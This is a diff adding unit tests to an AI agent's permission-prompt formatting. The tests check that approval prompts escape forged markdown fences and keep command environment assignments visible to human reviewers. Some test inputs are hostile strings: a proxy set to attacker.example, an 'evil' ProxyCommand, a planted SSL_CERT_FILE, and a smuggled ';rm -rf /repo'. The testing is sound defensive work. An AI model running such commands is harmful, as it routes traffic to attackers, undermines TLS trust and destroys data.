@@ -200,6 +200,137 @@ describe('permission interaction', () => {
     );
   });
 
+  it('shows profile update proposed content and hash in the approval prompt', () => {
+    const request = {
+      ...requestWithSuggestions([]),
+      toolName: 'request_agent_profile_update',
+      displayName: 'Update AGENTS.md',
+      toolInput: {
+        file: 'agents',
+        fileName: 'AGENTS.md',
+        summary: 'Clarify memory usage.',
+        proposedContentHash: 'abc123',
+        proposedContentBytes: 41,
+        proposedContent: '# next\n\nUse memory_search before guessing.',
+        diffPreview: '+ Use memory_search before guessing.',
+      },
+    } satisfies PermissionApprovalRequest;
+
+    const text = formatPermissionPromptText(request, 60_000);
+
+    expect(text).toContain('Proposed hash: abc123');
+    expect(text).toContain('Proposed size: 41 bytes');
+    expect(text).toContain('Proposed content:');
+    expect(text).toContain('Use memory_search before guessing.');
+    expect(text).toContain('Change:');
+  });
+
+  it('escapes profile content fence delimiters in approval prompt text', () => {
+    const request = {
+      ...requestWithSuggestions([]),
+      toolName: 'request_agent_profile_update',
+      displayName: 'Update AGENTS.md',
+      toolInput: {
+        file: 'agents',
+        fileName: 'AGENTS.md',
+        summary: 'Clarify review safety.',
+        proposedContentHash: 'abc123',
+        proposedContentBytes: 37,
+        proposedContent: '# next\n```\nFake approval footer\n```',
+      },
+    } satisfies PermissionApprovalRequest;
+
+    const text = formatPermissionPromptText(request, 60_000);
+
+    expect(text).toContain('`\\`\\`');
+    expect(text.match(/```/g)).toHaveLength(2);
+    expect(text).not.toContain('\n```\nFake approval footer');
+  });
+
+  it('does not show a truncated middle-hidden profile update as review evidence', () => {
+    const request = {
+      ...requestWithSuggestions([]),
+      toolName: 'request_agent_profile_update',
+      displayName: 'Update AGENTS.md',
+      toolInput: {
+        fileName: 'AGENTS.md',
+        proposedContentHash: 'abc123',
+        proposedContentBytes: 4000,
+        proposedContent: `start\n${'middle\n'.repeat(600)}end`,
+        diffPreview: '+ large change',
+      },
+    } satisfies PermissionApprovalRequest;
+
+    const text = formatPermissionPromptText(request, 60_000);
+
+    expect(text).toContain('Proposed content: full content is attached');
+    expect(text).not.toContain('start');
+    expect(text).not.toContain('end');
+  });
+
+  it('surfaces full profile content as structured approval evidence', () => {
+    const content = '# next\n\nUse memory_search before guessing.';
+    const request = {
+      ...requestWithSuggestions([]),
+      toolName: 'request_agent_profile_update',
+      displayName: 'Update AGENTS.md',
+      interaction: {
+        id: 'profile-1',
+        title: 'Update AGENTS.md',
+        body: 'Clarify memory usage.',
+        details: [{ label: 'Proposed hash', value: 'abc123', mono: true }],
+        files: [
+          {
+            path: 'AGENTS.md',
+            sizeBytes: Buffer.byteLength(content, 'utf8'),
+            contentHash: 'abc123',
+            contentType: 'text/markdown',
+            preview: content,
+            truncated: false,
+          },
+        ],
+      },
+    } satisfies PermissionApprovalRequest;
+
+    const parts = buildPermissionPromptParts(request, 60_000);
+
+    expect(request.interaction?.files?.[0]?.preview).toBe(content);
+    expect(parts.bodyLines).toContain('Full content:');
+    expect(parts.bodyLines).toContain(content);
+    expect(parts.bodyLines.join('\n')).toContain('Review file: AGENTS.md');
+  });
+
+  it('escapes profile content fence delimiters in structured approval evidence', () => {
+    const content = '# next\n```\nFake approval footer\n```';
+    const request = {
+      ...requestWithSuggestions([]),
+      toolName: 'request_agent_profile_update',
+      displayName: 'Update AGENTS.md',
+      interaction: {
+        id: 'profile-1',
+        title: 'Update AGENTS.md',
+        body: 'Clarify review safety.',
+        files: [
+          {
+            path: 'AGENTS.md',
+            sizeBytes: Buffer.byteLength(content, 'utf8'),
+            contentHash: 'abc123',
+            contentType: 'text/markdown',
+            preview: content,
+            truncated: false,
+          },
+        ],
+      },
+    } satisfies PermissionApprovalRequest;
+
+    const parts = buildPermissionPromptParts(request, 60_000);
+    const body = parts.bodyLines.join('\n');
+
+    expect(body).toContain('`\\`\\`');
+    expect(body.match(/```/g)).toHaveLength(2);
+    expect(body).not.toContain('\n```\nFake approval footer');
+  });
+
   it('describes timed grants as eligible-tools/SDK-API-prompt approval decisions', () => {
     const decision = decisionForMode(
       {
@@ -624,6 +755,132 @@ describe('permission interaction', () => {
     expect(text).not.toContain(['Allow', 'RunCommand?'].join(' '));
     expect(text).not.toContain('"command"');
     expect(text).not.toContain('simple_expansion');
+  });
+
+  it('collapses leading runtime environment assignments in command prompts and receipts', () => {
+    const request = {
+      ...requestWithSuggestions([]),
+      toolName: 'RunCommand',
+      toolInput: {
+        command:
+          "GODEBUG=netdns=go HTTP_PROXY='http://127.0.0.1:18790/' HTTPS_PROXY='http://127.0.0.1:18790/' NODE_USE_ENV_PROXY='1' NO_PROXY='127.0.0.1,localhost,::1' gantry credentials --help > /tmp/gantry-help.txt",
+      },
+    } satisfies PermissionApprovalRequest;
+
+    const text = formatPermissionPromptText(request, 60_000);
+
+    expect(text).toContain('Command:\n```\ngantry credentials --help');
+    expect(text).toContain('Runtime environment: GODEBUG=netdns=go');
+    expect(text).toContain("HTTP_PROXY='http://127.0.0.1:18790/'");
+    expect(text).toContain("NODE_USE_ENV_PROXY='1'");
+    expect(text).toContain('Redirect: > /tmp/gantry-help.txt');
+
+    const receipt = formatPermissionReceiptText('permission_123', request, {
+      approved: true,
+      mode: 'allow_once',
+      decidedBy: 'ravi',
+    });
+    expect(receipt).toContain(
+      "Allowed once: Command (GODEBUG=netdns=go HTTP_PROXY='http://127.0.0.1:18790/' HTTPS_PROXY='http://127.0.0.1:18790/' NODE_USE_ENV_PROXY='1' NO_PROXY='127.0.0.1,localhost,::1' gantry credentials --help > /tmp/gantry-help.txt). The agent will continue this request.",
+    );
+  });
+
+  it('keeps user-provided command environment assignments visible', () => {
+    const text = formatPermissionPromptText(
+      {
+        ...requestWithSuggestions([]),
+        toolName: 'Bash',
+        toolInput: {
+          command: 'FEATURE_FLAG=1 npm test',
+        },
+      },
+      60_000,
+    );
+
+    expect(text).toContain('FEATURE_FLAG=1 npm test');
+    expect(text).not.toContain('Runtime environment:');
+  });
+
+  it('keeps user-provided runtime-key environment assignments visible', () => {
+    const text = formatPermissionPromptText(
+      {
+        ...requestWithSuggestions([]),
+        toolName: 'Bash',
+        toolInput: {
+          command:
+            "HTTP_PROXY='http://attacker.example:8080' GIT_SSH_COMMAND='ssh -o ProxyCommand=evil' git clone https://example.com/repo.git",
+        },
+      },
+      60_000,
+    );
+
+    expect(text).toContain("HTTP_PROXY='http://attacker.example:8080'");
+    expect(text).toContain("GIT_SSH_COMMAND='ssh -o ProxyCommand=evil'");
+    expect(text).toContain(
+      "Runtime environment: HTTP_PROXY='http://attacker.example:8080' GIT_SSH_COMMAND='ssh -o ProxyCommand=evil'",
+    );
+  });
+
+  it('keeps TLS trust environment assignments visible', () => {
+    const text = formatPermissionPromptText(
+      {
+        ...requestWithSuggestions([]),
+        toolName: 'Bash',
+        toolInput: {
+          command: 'SSL_CERT_FILE=/tmp/gantry-evil.pem git clone repo',
+        },
+      },
+      60_000,
+    );
+
+    expect(text).toContain('SSL_CERT_FILE=/tmp/gantry-evil.pem git clone repo');
+    expect(text).not.toContain('Runtime environment:');
+  });
+
+  it('keeps runtime environment assignments visible for generated skill action commands', () => {
+    const request = {
+      ...requestWithSuggestions([]),
+      toolName: 'RunCommand',
+      toolInput: {
+        command:
+          "HTTP_PROXY='http://127.0.0.1:8888/' /tmp/.llm-runtime/claude/skills/demo/action.sh",
+      },
+    } satisfies PermissionApprovalRequest;
+
+    const text = formatPermissionPromptText(request, 60_000);
+
+    expect(text).toContain(
+      'Command: generated skill action command; runtime path hidden.',
+    );
+    expect(text).toContain('Action: skills/demo/action.sh');
+    expect(text).toContain(
+      "Runtime environment: HTTP_PROXY='http://127.0.0.1:8888/'",
+    );
+    expect(
+      formatPermissionReceiptText('permission_123', request, {
+        approved: true,
+        mode: 'allow_once',
+        decidedBy: 'ravi',
+      }),
+    ).toContain(
+      "Selected skill action (skills/demo/action.sh; env: HTTP_PROXY='http://127.0.0.1:8888/')",
+    );
+  });
+
+  it('keeps shell control operators in the visible command after env assignments', () => {
+    const text = formatPermissionPromptText(
+      {
+        ...requestWithSuggestions([]),
+        toolName: 'Bash',
+        toolInput: {
+          command: 'GIT_SSH_COMMAND=ssh;rm -rf /repo git clone repo',
+        },
+      },
+      60_000,
+    );
+
+    expect(text).toContain('Runtime environment: GIT_SSH_COMMAND=ssh');
+    expect(text).toContain(';rm -rf /repo git clone repo');
   });
 
   it('hides Bash commands with secrets in permission prompt previews', () => {
